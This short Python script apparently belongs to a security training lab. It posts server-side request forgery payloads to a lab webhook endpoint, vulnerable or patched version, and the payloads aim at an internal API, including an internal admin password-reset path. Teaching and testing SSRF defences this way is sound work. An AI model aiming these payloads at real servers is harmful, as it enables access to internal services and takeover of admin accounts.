import json
from urllib.error import URLError
from urllib.request import Request, urlopen

import cli


def main(use_vulnerable_endpoint: bool, url_prefix: str) -> None:
    if use_vulnerable_endpoint:
        url = f"{url_prefix}/vulnerabilities/ssrf1/submit_webhook/"
    else:
        url = f"{url_prefix}/patches/ssrf1/submit_webhook/"

    for url_payload in [
        "http://internal_api",
        "http://internal_api:12302",
        "http://internal_api:12302/reset_admin_password/",
    ]:
        data = {"url": url_payload}

        try:
            req = Request(
                url,
                data=json.dumps(data).encode("utf-8"),
                method="POST",
                headers={"Content-Type": "application/json"},
            )

            with urlopen(req) as response:
                print(f"Response for {url_payload}: {response.read().decode('utf-8')}")
        except URLError as e:
            print(f"Error with {url_payload}: {e}")


if __name__ == "__main__":
    use_vulnerable_endpoint, url_prefix = cli.get_cli_arguments()
    main(use_vulnerable_endpoint, url_prefix)
